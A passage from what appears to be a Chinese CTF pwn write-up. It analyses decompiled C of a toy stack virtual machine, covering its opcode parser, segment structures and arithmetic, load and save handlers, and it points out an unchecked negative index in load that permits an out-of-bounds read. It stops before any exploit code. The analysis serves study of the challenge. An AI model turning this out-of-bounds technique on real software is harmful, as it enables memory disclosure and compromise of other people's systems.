class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"push"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">17LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"pop"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">18LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"add"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">33LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"sub"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">34LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"mul"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">35LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"div"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">36LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"load"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">49LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"save"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">50LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">{</span>
        ptr<span class="token punctuation">[</span>v2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">255LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token operator">++</span>v2<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_40144E</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
      <span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>函数接受两个参数，a1为text段的指针，a2为缓冲区的指针，strtok函数原型如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">strtok</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>delim<span class="token punctuation">)</span>
str <span class="token operator">--</span> 要被分解成一组小字符串的字符串。
delim <span class="token operator">--</span> 包含分隔符的 C 字符串。
该函数返回被分解的第一个子字符串，如果没有可检索的字符串，则返回一个空指针。</code></pre>
<p>程序中的delim为<strong>\n\r\t</strong>，<strong>strtok(a2, delim)</strong>就是以<strong>\n\r\t</strong>分割a2中的字符串</p>
<p>由下面的if-else语句我们可以知道程序实现了<strong>push,pop,add,sub,mul,div,load,save</strong>这几个功能，每个功能都对应着一个opcode，将每一个opcode存储到函数中分配的一个临时data段中(函数执行完后这个chunk就会被free掉)</p>
<p>sub_40144E函数如下</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub_40144E</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">==</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">8LL</span> <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">=</span> a2<span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这个函数是用来将函数中的临时text段的指令转移到程序中的text段的，每八个字节存储一个opcode，需要注意的是，这里存储opcode的顺序和我们输入指令的顺序是相反的(不过也没啥需要主义的，反正程序是按照我们输入的指令顺序来执行的)。</p>
<p>write_stack函数如下</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">write_data</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-28h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-24h]</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-20h]</span>
  _QWORD <span class="token operator">*</span>ptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-18h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8LL</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> delim<span class="token punctuation">)</span><span class="token punctuation">;</span> v2 <span class="token operator">&lt;</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> nptr<span class="token punctuation">;</span> nptr <span class="token operator">=</span> <span class="token function">strtok</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">,</span> delim<span class="token punctuation">)</span> <span class="token punctuation">)</span>
      ptr<span class="token punctuation">[</span>v2<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">atol</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> v2 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_40144E</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> ptr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>
      <span class="token punctuation">;</span>
    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>和store_opcode函数相比就是去掉了存储opcode的环节，将我们输入的数据存储在stack段中。</p>
<p>我们再看到execute函数</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub_401967</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> __int64 a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-28h]</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-Ch]</span>
  __int64 v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v6<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span> v6 <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token number">0x11LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">push</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x12LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">pop</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x21LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x22LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">sub</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x23LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">mul</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x24LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">div</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x31LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">load</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token number">0x32LL</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token function">save</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token keyword">default</span><span class="token punctuation">:</span>
        v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> v5<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>接受三个参数，a1为text段结构体的指针，a2为stack段结构体的指针，a3为data段结构体的指针</p>
<p>take_value函数如下</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">take_value</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>a1 <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>a2 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">8LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这个就是从text段中取opcode，从后往前取，因为是倒叙存储，所以最后一个opcode就是我们输入的第一个指令。</p>
<p>取出opcode之后通过switch语句来执行对应的功能，首先看到push函数</p>
<pre class=" language-c"><code class="language-c">_BOOL8 __fastcall <span class="token function">push</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">0x40144E</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>接受两个参数，a1为data段结构体的指针，a2为stack段结构体的指针，push中有两个函数，第一个函数从stack中取值，第二个函数将从stack中取出的值存入data段中</p>
<p>pop函数</p>
<pre class=" language-c"><code class="language-c">_BOOL8 __fastcall <span class="token function">pop</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">0X40144E</span><span class="token punctuation">(</span>a2<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>pop函数中的两个函数和push函数相同，只不过参数不一样，将a1和a2的位置调换了一下，push将stack的值放入data段中，pop则将data中的值放入stack段中</p>
<p>add函数</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">add</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v3 <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>add只接受一个参数，data段结构体的指针</p>
<p>通过两个tack_value函数从data段中取出两个连续值，然后将两个值的和写入data段</p>
<p>sub</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">sub</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v2 <span class="token operator">-</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>sub函数和add函数的区别在于sub函数将两个值的插写入data段</p>
<p>mul</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">mul</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v3 <span class="token operator">*</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>将两个值的乘积写入data段</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">div</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> v2 <span class="token operator">/</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>将两个值的商写入data段</p>
<p>load</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">load</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">take_value</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">write_data</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>a1 <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">+</span> v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>load函数只接受一个参数，为data段结构体指针，首先从data段取出一个值，然后我们分析一下下面这一段的意思</p>
<pre><code>*(_QWORD *)(*(_QWORD *)a1 + 8 * (*(int *)(a1 + 12) + v2))</code></pre><p><strong>*(_QWORD *)a1</strong>为data段结构体的值，即data段指针，<strong>*(int *)(a1 + 12)</strong>为data段中存储数据的个数，再加上v2，作为索引的依据，将<strong><em>(_QWORD *)(</em>(_QWORD <em>)a1 + 8 * (</em>(int *)(a1 + 12) + v2))</strong>的值载入data段。这里关键的一点就是，v2作为索引的一部分是用户输入的，而这里也并未对v2的值做限制，当v2为负数时就可以越界读，将不属于data段的值载入data段，这里就是漏洞之一。</p>
<p>save</p>
<pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">save</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  __int64 v2<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

